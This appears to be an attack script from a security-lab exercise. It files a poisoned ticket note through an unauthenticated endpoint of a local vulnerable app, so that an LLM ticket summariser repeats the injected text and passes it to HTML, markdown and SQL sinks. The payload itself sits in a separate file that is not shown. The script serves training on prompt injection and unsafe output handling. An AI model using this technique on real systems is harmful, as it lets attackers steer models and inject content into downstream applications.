#!/usr/bin/env python3
"""Attack skill — poison a ticket so Billy's summary carries sink-active text.

AUTHORIZED SECURITY-LAB USE ONLY. Targets this skill's own vulnerable_app.py.

Appends ``assets/poisoned_note.md`` to one account's ticket notes (default
``ridgeview``) through the unauthenticated ``POST /tickets/note``. The model
then emits the note's placeholder line as its summary, and the application
passes that summary to its HTML, markdown and SQL sinks. The attack does not
touch any sink; whether the output does harm is decided by how each sink
handles it.

Exit code: 0 when the note was filed, 1 when the target is unreachable.

Examples:
    python scripts/run_sink_poison.py
    python scripts/run_sink_poison.py --account ridgeview --payload assets/poisoned_note.md
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import urllib.error
import urllib.request

SKILL_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DEFAULT_TARGET = os.getenv("LLM10_TARGET", "http://127.0.0.1:5210")
DEFAULT_PAYLOAD = os.path.join(SKILL_DIR, "assets", "poisoned_note.md")


def _post(url: str, body: dict) -> dict:
    req = urllib.request.Request(
        url, data=json.dumps(body).encode("utf-8"),
        headers={"Content-Type": "application/json"}, method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read())


def check_target(base: str) -> bool:
    try:
        with urllib.request.urlopen(f"{base}/health", timeout=5) as resp:
            ok = json.loads(resp.read()).get("demo") == "llm10"
    except (urllib.error.URLError, OSError, ValueError):
        ok = False
    if not ok:
        print(f"[-] {base} is not the LLM10 target. Start it: python vulnerable_app.py")
    return ok


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--target", default=DEFAULT_TARGET)
    parser.add_argument("--account", default="ridgeview", help="account whose tickets to poison")
    parser.add_argument("--payload", default=DEFAULT_PAYLOAD, help="note content to file")
    args = parser.parse_args(argv)

    if not check_target(args.target):
        return 1
    with open(args.payload, "r", encoding="utf-8") as fh:
        content = fh.read()

    print(f"[*] Filing {os.path.basename(args.payload)} as a ticket note on '{args.account}' "
          f"(unauthenticated POST /tickets/note)")
    result = _post(f"{args.target}/tickets/note", {"account": args.account, "note": content})
    print(f"[+] Note saved on '{result['account']}'. 1 note added; no sink or other account touched.")
    print("[*] Re-run scripts/evaluate_kpi.py to measure the effect.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
